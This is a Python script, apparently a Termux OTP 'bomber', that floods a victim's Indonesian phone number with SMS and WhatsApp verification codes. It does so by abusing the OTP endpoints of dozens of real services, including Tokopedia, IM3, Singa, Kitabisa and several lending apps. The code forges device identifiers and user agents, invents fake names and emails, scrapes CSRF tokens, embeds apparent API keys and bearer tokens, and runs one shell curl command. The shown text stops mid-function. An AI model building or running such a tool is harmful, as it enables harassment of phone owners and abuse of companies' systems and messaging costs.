import os
import sys
import time
import re
import json
import requests
import threading
import random
import base64
import uuid
import phonenumbers
import subprocess
import hashlib
import socket
import platform
import string
import signal
import smtplib
import getpass
import urllib.request
import urllib.error
import urllib3
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from phonenumbers import NumberParseException
from phonenumbers import geocoder, carrier, timezone as phone_timezone
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote, unquote
from colorama import Fore, Back, init
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from wcwidth import wcswidth
from rich.panel import Panel
from rich.console import Console
from phonenumbers import geocoder, carrier, timezone, PhoneNumberType, NumberParseException
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

SESSION_FILE = '/data/data/com.termux/files/home/.otp_session.json'

a = '\x1b[1;30m'
m = '\x1b[1;31m'
h = '\x1b[1;32m'
k = '\x1b[1;33m'
c = '\x1b[1;36m'
p = '\x1b[1;37m'
r = '\x1b[0m'

def update_leaderboard(value):
    pass

def kirim_log_aktivitas(activity, number):
    pass
    
def spam_otp_codex(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def spam_otp_nilai(response, start, end):
    try:
        idx = response.find(start)
        if idx == -1:
            return None
        idx += len(start)
        tail = response[idx:]
        end_idx = tail.find(end)
        if end_idx == -1:
            return None
        return tail[:end_idx]
    except:
        return None

def spam_otp_im3(nomor):
    try:
        session = requests.Session()
        url = "https://myim3api1.ioh.co.id/api/v2/otp/send/web"
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        payload = {
            "msisdn": nomor,
            "action": "register"
        }
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_singa_v1(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False
        
def spam_otp_singa_v2(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_singa_v3(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False
 
def spam_otp_singa_v4(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False

def spam_otp_singa_v5(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor = nomor
        else:
            nomor = '0' + nomor
        
        models = ['SM-S928B', 'SM-G965N', 'SM-N975F', 'SM-A515F', 'SM-M127F', 'Infinix X6532C', 'Redmi Note 10', 'POCO X3', 'vivo 2007', 'OPPO CPH2083']
        model = random.choice(models)
        
        versions = ['2.4.7', '2.4.8', '2.4.9', '2.5.0', '2.5.1']
        versionName = random.choice(versions)
        versionCode = versionName.replace('.', '')
        
        systemVersions = ['11', '12', '13', '14']
        systemVersion = random.choice(systemVersions)
        
        appsflyer_id = str(int(time.time() * 1000)) + '-' + str(random.randint(1000000000000000000, 9999999999999999999))
        
        session = requests.Session()
        
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': f'Mozilla/5.0 (Linux; Android {systemVersion}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'
        }
        
        url = f'https://api102.singa.id/new/login/sendWaOtp?versionName={versionName}&versionCode={versionCode}&model={model}&systemVersion={systemVersion}&platform=android&appsflyer_id={appsflyer_id}'
        
        payload = {
            'mobile_phone': nomor,
            'type': 'mobile',
            'is_switchable': 1
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '"msg":"', '"') == 'Success'
    except:
        return False
                     
def spam_otp_ktakilat(nomor):
    try:
        import requests, json, base64, random

        device_data = {
            "adChannel": "organic",
            "adId": "15497a9b-2669-42cf-ad10-d0d0d8f50ad0",
            "androidId": ''.join(random.choices('abcdef0123456789', k=16)),
            "appName": "KtaKilat",
            "appVersion": "5.2.6",
            "countryCode": "ID",
            "countryName": "Indonesia",
            "cpuCores": 4,
            "deliveryPlatform": "google play",
            "deviceNo": ''.join(random.choices('abcdef0123456789', k=16)),
            "imei": "",
            "imsi": "",
            "mac": "00:db:34:3b:e5:67",
            "memoryTotal": 4137971712,
            "packageName": "com.ktakilat.loan",
            "phoneBrand": "samsung",
            "phoneBrandModel": "SM-G965N",
            "sdCardTotal": 35139592192,
            "systemPlatform": "android",
            "systemVersion": "9",
            "uuid": ''.join(random.choices('abcdef0123456789', k=32))
        }
        device_info = base64.b64encode(json.dumps(device_data).encode()).decode()

        headers = {
            'Content-Type': 'application/json; charset=UTF-8',
            'Device-Info': device_info
        }
        payload = {'mobileNo': nomor, 'smsType': 1}

        resp = requests.post('https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode', 
                            json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_uangme(nomor):
    try:
        aid = f'gaid_15497a9b-2669-42cf-ad10-{spam_otp_codex(12)}'
        url = f'https://api.uangme.com/api/v2/sms_code?phone={nomor}&scene_type=login&send_type=wp'
        headers = {'aid': aid, 'android_id': 'b787045b140c631f', 'app_version': '300504', 'brand': 'samsung', 'carrier': '00', 'Content-Type': 'application/x-www-form-urlencoded', 'country': '510', 'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0', 'fcm_reg_id': 'frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo', 'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0', 'lan': 'in_ID', 'model': 'SM-G965N', 'ns': 'wifi', 'os': '1', 'timestamp': '1732178536', 'tz': 'Asia%2FBangkok', 'User-Agent': 'okhttp/3.12.1', **{'v': '1', 'version': '28'}}
        res = requests.get(url, headers=headers, timeout=10)
    except:
        return False

def spam_otp_tokopedia(nomor):
    try:
        session = requests.Session() 
        url_token = f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search('<input\\s+id=\"Token\"\\s+value=\"([^\"]+)\"', resp.text)
        if not token:
            return False
        url_otp = 'https://accounts.tokopedia.com/otp/c/ajax/request-wa'
        data = {'otp_type': '116', 'msisdn': nomor, 'tk': token.group(1), 'email': '', 'original_param': '', 'user_id': '', 'signature': '', 'number_otp_digit': '6'}
        headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['X-Requested-With'] = 'XMLHttpRequest'
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
    except:
        return False

def format_nomor(nomor):
    nomor = nomor.strip().replace(' ', '').replace('-', '')
    if nomor.startswith('0'):
        phone = '+62' + nomor[1:]
        username = '0' + nomor[1:]
    elif nomor.startswith('62'):
        phone = '+' + nomor
        username = '0' + nomor[2:]
    elif nomor.startswith('+62'):
        phone = nomor
        username = '0' + nomor[3:]
    else:
        phone = '+62' + nomor
        username = '0' + nomor
    return (phone, username)

def spam_otp_duniagames(nomor):
    try:
        phone, username = format_nomor(nomor)
        session = requests.Session()
        url = 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp'
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id', 'ciam-type': 'FR', 'content-type': 'application/json', 'origin': 'https://duniagames.co.id', 'referer': 'https://duniagames.co.id/', 'sec-ch-ua': '\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-device': '1ee352b7-d541-418f-a7b9-82d9358ea6a4'}
        payload = {'phoneNumber': phone, 'userName': username}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_planetban(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        url = 'https://api.planetban.com/website/customer/request-otp'
        headers = {'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://planetban.com', 'referer': 'https://planetban.com/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        payload = {'phone': nomor, 'purpose': 'register', 'method': 'whatsapp'}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_rumah123(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        ua_url = 'https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt'
        ua_list = requests.get(ua_url, timeout=10).text.strip().split('\n')
        ua = random.choice(ua_list)
        session = requests.Session()
        url = 'https://www.rumah123.com/api/otp/request-otp'
        headers = {'User-Agent': ua, 'sec-ch-ua-platform': '"Windows"', 'Referer': 'https://www.rumah123.com/user/login', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"', 'sec-ch-ua-mobile': '?0', 'baggage': 'sentry-environment=production,sentry-release=99-core-api%401.0.0,sentry-public_key=50dec5eb30e19517693eb88cec8c3d07,sentry-trace_id=5368e13ab971475eb79b18f53bda3124', 'sentry-trace': '5368e13ab971475eb79b18f53bda3124-bd2b5a8fe7ed22fd-0', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json;charset=UTF-8', 'Base-Url-Core': 'https://www.rumah123.com'}
        payload = {'cancelledRequestId': '', 'phoneNumber': f'62{nomor}', 'portalId': 1, 'type': 'WHATSAPP'}
        resp = session.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        return False

def spam_otp_paperid(nomor):
    try:
        if nomor.startswith('62'):
            nomor_format = nomor
        elif nomor.startswith('0'):
            nomor_format = '62' + nomor[1:]
        else:
            nomor_format = nomor
        session = requests.Session()
        ua = 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        pua = 'Jupiter/7.10.13 mobile_web (linux) Chrome 146'
        user = ''.join(random.choices(string.ascii_lowercase, k=8))
        email = f'{user}@gmail.com'
        fprint = 'A20dt' + spam_otp_codex(15)
        reqid = spam_otp_codex(52)
        session.post('https://mail.paper.id/api/validate-mail', json={'email': email}, headers={'request-id': reqid, 'user-agent': ua, 'content-type': 'application/json'}, timeout=10)
        session.post('https://api.paper.id/api/v1/auth/login/check', json={'fingerprint': fprint, 'email': email}, headers={'request-id': reqid, 'user-agent': ua, 'content-type': 'application/json'}, timeout=10)
        session.post('https://api.paper.id/api/v1/auth/fingerprints/check', json={'action': 'register', 'email': email, 'phone': nomor_format, 'fingerprint': fprint}, headers={'request-id': reqid, 'user-agent': ua, 'x-paper-user-agent': pua, 'content-type': 'application/json'}, timeout=10)
        resp = session.post('https://register.paper.id/api/v1/auth/register/send-otp', json={'phone': nomor_format, 'method': 'whatsapp', 'registered_by': 'web'}, headers={'request-id': reqid, 'user-agent': ua, 'x-paper-user-agent': pua, 'content-type': 'application/json', 'origin': 'https://www.paper.id', 'referer': 'https://www.paper.id/'}, timeout=10)
    except:
        return False

def spam_otp_uku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
      
        import secrets
        
        imei = secrets.token_hex(16)
        
        headers = {
            "Host": "gateway.ukuindo.com",
            "Accept": "application/json",
            "Appsflyerid": "1739206918799-3547019681597550358",
            "Device": "ANDROID",
            "Distinctid": "undefined",
            "Imei": imei,
            "Version": "6092201",
            "Versioncode": "6.9.22",
            "Accept-Language": "id_ID",
            "Adid": "",
            "Channel": "GooglePlay",
            "Product": "uku",
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.9.2"
        }
        
        payload = {
            "phone": nomor_lokal,
            "smsType": "SMS",
            "channel": "GooglePlay",
            "appInstanceId": ""
        }
        
        response = requests.post(
            "https://gateway.ukuindo.com/entrance/v3/getcode",
            headers=headers,
            json=payload
        )
        
        return response
        
    except Exception as e:
        return None

def spam_otp_pinhome(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        url = 'https://www.pinhome.id/api/pinaccount/request/otp'
        headers = {'Host': 'www.pinhome.id', 'Accept': 'application/json', 'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10)', 'Origin': 'https://www.pinhome.id'}
        payload = {'accountType': 'customers', 'countryCode': '62', 'medium': 'whatsapp', 'otpType': 'register', 'phoneNumber': nomor_lokal}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_adiraku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        payload = {'mobileNumber': nomor_lokal, 'type': 'prospect-create', 'channel': 'whatsapp'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_yogyaonline(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        session = requests.Session()
        session.get('https://www.yogyaonline.co.id/register', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, timeout=10)
        headers = {'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://www.yogyaonline.co.id', 'referer': 'https://www.yogyaonline.co.id/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}
        resp = session.post('https://www.yogyaonline.co.id/api/v1/send-otp', json={'phone_number': nomor_lokal}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_kitabisa_wea(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        
        curl_command = f'''curl -s -X POST 'https://gate.kitabisa.com/wong/register/draft' \
  -H 'accept: application/json' \
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'content-type: application/json' \
  -H 'origin: https://accounts.kitabisa.com' \
  -H 'referer: https://accounts.kitabisa.com/' \
  -H 'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36' \
  -H 'version: 3.4.0' \
  -H 'x-ktbs-api-version: 1.0.0' \
  -H 'x-ktbs-client-name: kanvas' \
  -H 'x-ktbs-client-version: 1.0.0' \
  -H 'x-ktbs-platform-name: kanvas' \
  -H 'x-ktbs-request-id: 1c3f6c98-2007-4124-933a-946348406887' \
  -H 'x-ktbs-signature: cf6bb271fda15fb3083a336e71b27db7d3e6b410a2026d7e377f1cd5cdb83645' \
  -H 'x-ktbs-time: 1782837706' \
  -d '{{"full_name":"Fahri reza","username":"{nomor}","otp_type":"whatsapp"}}' '''
        
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            try:
                return json.loads(result.stdout)
            except:
                return result.stdout
        else:
            return {"error": result.stderr}
            
    except Exception as e:
        return {"error": str(e)}

def spam_otp_saturdays(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        url = 'https://beta.api.saturdays.com/api/v1/user/otp/send'
        headers = {'accept': '*/*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'authorization': 'undefined', 'content-type': 'application/json', 'country-code': 'ID', 'currency-code': 'IDR', 'device-type': 'mweb', 'origin': 'https://saturdays.com', 'referer': 'https://saturdays.com/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'platform': 'mweb', **{'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj'}}
        payload = {'number': nomor_lokal, 'country_code': '+62', 'type': ''}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_bantusaku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        unique_code = str(uuid.uuid4())
        url = 'https://m.bantusaku.id/api/user/send-sms'
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://m.bantusaku.id', 'referer': 'https://m.bantusaku.id/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-auth-token': 'null', 'x-device-os': 'web', 'x-merchant': 'BantuSaku', 'x-token-sign': unique_code, 'x-version': 'web-3.2.1'}
        payload = {'phone': nomor_lokal, 'type': 'register', 'imageCode': '', 'merchantNo': 'BantuSaku', 'uniquCode': unique_code}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_mengantar(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f'{random.choice(first)} {random.choice(last)}'
        email = f"{nama.lower().replace(' ', '')}{random.randint(10, 99)}@gmail.com"
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://app.mengantar.com', 'referer': 'https://app.mengantar.com/id/register', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'}
        payload = {'courier': 'JNE', 'email': email, 'language': 'id', 'name': nama, 'phone': nomor, 'subject': 'register', 'verificationType': 'whatsapp'}
        resp = session.post('https://app.mengantar.com/api/auth/send-verification-code', json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_daihatsu(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
        session = requests.Session()
        resp_page = session.get('https://www.astra-daihatsu.id/register', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, timeout=10)
        csrf = ''
        for line in resp_page.text.splitlines():
            if 'CSRFToken' in line and 'value=' in line:
                csrf = line.split('value=\"')[1].split('\"')[0]
                break
        if not csrf:
            return False
        headers = {'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/json; charset=UTF-8', 'csrftoken': csrf, 'origin': 'https://www.astra-daihatsu.id', 'referer': 'https://www.astra-daihatsu.id/register', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'sec-ch-ua': '\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'}
        resp = session.post('https://www.astra-daihatsu.id/otp/whatsapp/generate', json={'phoneNo': nomor}, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_kreditpintar(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor
        uuid_val = str(__import__('uuid').uuid4())
        session = requests.Session()
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id', 'content-type': 'application/json', 'origin': 'https://go.kreditpintar.com', 'referer': f'https://go.kreditpintar.com/OFFICIAL2021/code-step?m={nomor}', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-adv-market-channel': 'OfficialWebsite', 'x-adv-uuid': uuid_val, 'x-app-version': 'APPVERSION_NAME(9999)', 'x-os-type': 'WEB', 'x-user-agent': f'Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0'}
        resp = session.post('https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id', json={'mobileNumber': nomor, 'type': 'SMS'}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_bunda(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        session = requests.Session()
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.bunda.co.id', 'referer': 'https://www.bunda.co.id/id', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-locale': 'id'}
        resp = session.post('https://cms.bunda.co.id/api/v1/auth/send-otp', json={'phone_number': int(nomor), 'type': 'auth'}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_maulagi(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://maulagi.id', 'referer': 'https://maulagi.id/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-ml-key': 'E32VCHXX32'}
        resp = session.post('https://api.maulagi.id/api/v2/auth/check', json={'credentials': nomor}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_codex(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def spam_otp_beautyhaul(nomor):
    try:
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if nomor.startswith("0"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "0" + nomor
        
        nomor_kirim = nomor_lokal[1:]
        
        session = requests.Session()
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.beautyhaul.com',
            'referer': 'https://www.beautyhaul.com/account/register',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
        }
        
        session.get('https://www.beautyhaul.com/account/register', 
                   headers={'user-agent': headers['user-agent']}, 
                   timeout=10)
        
        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        
        nama_depan = random.choice(first)
        nama_belakang = random.choice(last)
        email = f'{nama_depan.lower()}{nama_belakang.lower()}{random.randint(10, 99)}@gmail.com'
